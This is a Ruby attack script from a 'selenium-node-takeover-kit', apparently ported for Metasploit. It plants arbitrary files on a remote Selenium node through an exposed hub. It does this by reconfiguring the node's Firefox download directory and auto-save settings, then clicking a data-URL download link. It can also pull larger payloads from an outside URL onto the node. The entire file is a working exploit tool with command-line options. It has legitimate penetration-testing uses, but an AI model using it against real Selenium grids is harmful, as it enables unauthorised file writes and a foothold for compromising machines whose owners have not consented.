#!/usr/bin/env ruby
# https://github.com/JonStratton/selenium-node-takeover-kit/blob/master/examples/selenium_node_upload.rb
#
# You can upload a file onto a remote selenium node by changing the download folder and clicking a download link.
# Small files can be encoded and used within url inline html. Larger files should be pulled remotely.
# Limits are 1. the context of the process on the selenium node, 2. it cannot overwrite files, and 3. it doesnt seem to be able to make dot files.
#
# Converted to Ruby for metasploit module

require 'selenium-webdriver'
require 'mime/types'
require 'base64'
require 'optparse'

options = {}
OptionParser.new do |opts|
  opts.banner = 'Usage: example.rb [options]'
  opts.on('-hURL', '--hubURL', 'Selenium Hub URL') do |h|
    options[:hub] = h
  end
  opts.on('-rFILE', '--remoteFILE', 'The destination of the uploaded files.') do |r|
    options[:remote] = r
  end
  opts.on('-lFILE', '--localFILE', 'The (small) local to upload.') do |l|
    options[:local] = l
  end
  opts.on('-uURL', '--url-fileURL', 'The URL for a file to upload. Useful for larger files.') do |u|
    options[:url_file] = u
  end
  opts.on('-mTYPE', '--mimeTYPE', 'The optional MIME type for the url-file. Will try to guess if empty.') do |m|
    options[:mime] = m
  end
  opts.on('-dDATA', '--dataDATA', 'Raw string to write to a new file.') do |d|
    options[:data] = d
  end
  opts.on('--help', 'Prints this help') do
    puts opts
    exit
  end
end.parse!

hub_url = options[:hub]
remote_file = options[:remote]
local_file = options[:local]
url_file = options[:url_file]
mime_type = options[:mime]
data = options[:data]

# if local file, slurp and encode it in a URL
if not local_file.to_s.empty? # Inline for small local files
  url_file = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
  mime_type = 'application/octet-stream;'
end

# if remote file and non mime, try to get it
if (not url_file.to_s.empty?) and mime_type.to_s.empty?
  mime_type = MIME::Types.type_for(url_file).first.content_type
end

# Inline html with an inline download file link
data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [url_file, File::basename(remote_file)]

# Configure browser profile to use custom download location and not prompt to save files for mime type. This should probably be turned off by default.
profile = Selenium::WebDriver::Firefox::Profile.new
profile['browser.download.folderList'] = 2
profile['browser.download.manager.showWhenStarting'] = false
profile['browser.download.dir'] = File::dirname(remote_file)
profile['browser.helperApps.neverAsk.saveToDisk'] = mime_type
capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
driver = Selenium::WebDriver.for :remote, :url => hub_url, :desired_capabilities => capabilities

# Load the data URL and click the download link
driver.navigate.to(data_url)
driver.find_element(:id, 'f').click
driver.quit

exit
